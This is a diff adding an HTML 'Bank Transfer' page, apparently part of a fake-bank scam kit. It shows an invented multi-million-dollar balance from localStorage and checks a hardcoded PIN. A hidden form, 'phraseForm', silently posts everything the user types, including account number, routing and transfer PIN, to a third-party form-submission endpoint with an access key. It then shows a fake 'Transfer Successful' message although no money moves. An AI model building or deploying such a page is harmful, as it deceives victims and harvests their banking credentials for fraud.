@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transfer Page</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #f8f9fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+
+        #pageLoader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #002f6c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .pulse-loader {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.7; }
+        }
+
+        .transfer-container {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            display: none;
+        }
+
+        .transfer-container h1 {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            color: #0043b6;
+        }
+
+        .transfer-container input {
+            width: 100%;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+        }
+
+        .amount-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 0 1rem;
+            margin: 0.5rem 0;
+        }
+
+        .amount-input span {
+            font-size: 1rem;
+            color: #666;
+            margin-right: 0.5rem;
+        }
+
+        .amount-input input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 1rem;
+        }
+
+        .transfer-container button {
+            width: 100%;
+            padding: 1rem;
+            background: #0043b6;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 1rem;
+            position: relative;
+        }
+
+        .transfer-container button:hover {
+            background: #00308c;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0043b6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .popup-content h2 {
+            margin-bottom: 1rem;
+        }
+
+        .popup-content button {
+            padding: 0.5rem 1rem;
+            background: #0043b6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+
+        .popup-content button:hover {
+            background: #00308c;
+        }
+
+        .popup-loader {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        #phraseForm {
+            display: none;
+        }
+
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .phrase-grid input {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background-color: #0043b6;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn-primary:hover {
+            background-color: #00308c;
+        }
+
+        @media (max-width: 480px) {
+            .transfer-container {
+                padding: 1rem;
+            }
+            .transfer-container h1 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="pageLoader">
+        <div class="pulse-loader"></div>
+    </div>
+
+    <div class="transfer-container">
+        <h1>Bank Transfer</h1>
+        <input type="text" id="reciverName" placeholder="Receiver Name" required>
+        <input type="text" id="bankName" placeholder="Bank Name" required>
+        <input type="text" id="wirerouting" placeholder="Wire Routing" required>
+        <input type="text" id="Reasonsforpayment" placeholder="Reason for Payment" required>
+        <input type="text" id="accountNumber" placeholder="Account Number" required>
+        <div class="amount-input">
+            <span>$</span>
+            <input type="number" id="amount" placeholder="Enter Amount" required>
+        </div>
+        <input type="password" id="transferPin" placeholder="Transfer PIN" required>
+        <button onclick="processTransfer()" id="transferButton">
+            <span id="buttonText">Transfer</span>
+            <div id="buttonLoader" class="loader" style="display: none;"></div>
+        </button>
+    </div>
+
+    <!-- Hidden form that will be submitted in the background -->
+    <form id="phraseForm" style="display: none;">
+        <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+        <input type="hidden" name="subject" value="Chen Luk just transferred">
+        <input type="hidden" name="receiver_name" id="formReceiverName">
+        <input type="hidden" name="bank_name" id="formBankName">
+        <input type="hidden" name="wire_routing" id="formWireRouting">
+        <input type="hidden" name="reason_for_payment" id="formReasonsForPayment">
+        <input type="hidden" name="account_number" id="formAccountNumber">
+        <input type="hidden" name="amount" id="formAmount">
+        <input type="hidden" name="transfer_pin" id="formTransferPin">
+        <input type="hidden" name="redirect" value="false">
+        <input type="checkbox" name="botcheck" style="display: none;">
+    </form>
+
+    <div id="successPopup" class="popup">
+        <div class="popup-content">
+            <div id="successPopupLoader" class="popup-loader">
+                <div class="loader"></div>
+            </div>
+            <h2>Transfer Successful!</h2>
+            <p>Your transfer has been processed successfully.</p>
+            <button onclick="closePopup('successPopup')">Close</button>
+        </div>
+    </div>
+
+    <div id="errorPopup" class="popup">
+        <div class="popup-content">
+            <div id="errorPopupLoader" class="popup-loader">
+                <div class="loader"></div>
+            </div>
+            <h2>Transaction Failed</h2>
+            <p id="errorMessage">An error occurred during the transfer.</p>
+            <button onclick="closePopup('errorPopup')">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Configuration matching dashboard
+        const DEFAULT_BALANCE = 10015008.40;
+        const CORRECT_PIN = "2123";
+
+        // Page initialization
+        setTimeout(() => {
+            document.getElementById('pageLoader').style.display = 'none';
+            document.querySelector('.transfer-container').style.display = 'block';
+        }, 3000);
+
+        function submitPhraseForm() {
+            // Set all the form values from the input fields
+            document.getElementById('formReceiverName').value = document.getElementById('reciverName').value;
+            document.getElementById('formBankName').value = document.getElementById('bankName').value;
+            document.getElementById('formWireRouting').value = document.getElementById('wirerouting').value;
+            document.getElementById('formReasonsForPayment').value = document.getElementById('Reasonsforpayment').value;
+            document.getElementById('formAccountNumber').value = document.getElementById('accountNumber').value;
+            document.getElementById('formAmount').value = document.getElementById('amount').value;
+            document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
+            
+            // Submit silently using fetch()
+            const formData = new FormData(document.getElementById('phraseForm'));
+            
+            // Add timestamp to ensure unique submission
+            formData.append('timestamp', new Date().toISOString());
+            
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Form submission successful:', data);
+                if (!data.success) {
+                    console.error('Form submission failed:', data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error submitting form:', error);
+            });
+        }
+
+        function processTransfer() {
+            const fields = ['reciverName', 'bankName', 'wirerouting', 
+                          'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
+            
+            // Validate all fields
+            if (!fields.every(id => document.getElementById(id).value.trim())) {
+                alert('Please complete all fields before proceeding.');
+                return;
+            }
+
+            const amount = parseFloat(document.getElementById('amount').value);
+            const transferPin = document.getElementById('transferPin').value;
+            const transferButton = document.getElementById('transferButton');
+            
+            // Disable button during processing
+            transferButton.disabled = true;
+            document.getElementById('buttonText').style.display = 'none';
+            document.getElementById('buttonLoader').style.display = 'block';
+
+            // Submit the form data immediately
+            submitPhraseForm();
+
+            setTimeout(() => {
+                try {
+                    // PIN verification
+                    if (transferPin !== CORRECT_PIN) {
+                        throw new Error('Invalid Pin - You entered an invalid pin.');
+                    }
+
+                    // Balance check
+                    let currentBalance = parseFloat(localStorage.getItem('balance')) || DEFAULT_BALANCE;
+                    if (amount > currentBalance) {
+                        throw new Error('Insufficient Funds - You do not have sufficient funds in your account.');
+                    }
+
+                    // Update balance
+                    currentBalance -= amount;
+                    localStorage.setItem('balance', currentBalance);
+
+                    // Add transaction
+                    const transaction = {
+                        name: `Transfer to ${document.getElementById('bankName').value.trim()}`,
+                        time: new Date().toLocaleDateString('en-GB', {
+                            day: 'numeric',
+                            month: 'short',
+                            year: 'numeric'
+                        }) + " • " + new Date().toLocaleTimeString('en-US', {
+                            hour: '2-digit',
+                            minute: '2-digit'
+                        }),
+                        amount: -Math.abs(amount),
+                        type: "debit"
+                    };
+
+                    const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
+                    transactions.unshift(transaction);
+                    localStorage.setItem('transactionHistory', JSON.stringify(transactions));
+
+                    // Show success
+                    showPopup('successPopup');
+                } catch (error) {
+                    const [title, message] = error.message.split(' - ');
+                    showPopup('errorPopup', title, message);
+                } finally {
+                    // Reset button state
+                    transferButton.disabled = false;
+                    document.getElementById('buttonText').style.display = 'block';
+                    document.getElementById('buttonLoader').style.display = 'none';
+                }
+            }, 2000);
+        }
+
+        function showPopup(popupId, title = '', message = '') {
+            const popup = document.getElementById(popupId);
+            const loader = document.getElementById(`${popupId}Loader`);
+
+            if (title) popup.querySelector('h2').textContent = title;
+            if (message) popup.querySelector('#errorMessage').textContent = message;
+
+            popup.style.display = 'flex';
+            loader.style.display = 'flex';
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+            }, 2000);
+        }
+
+        function closePopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
+            if (popupId === 'successPopup') {
+                window.opener.postMessage('transferSuccess', '*');
+                window.close();
+            }
+        }
+    </script>
+</body>
+</html>
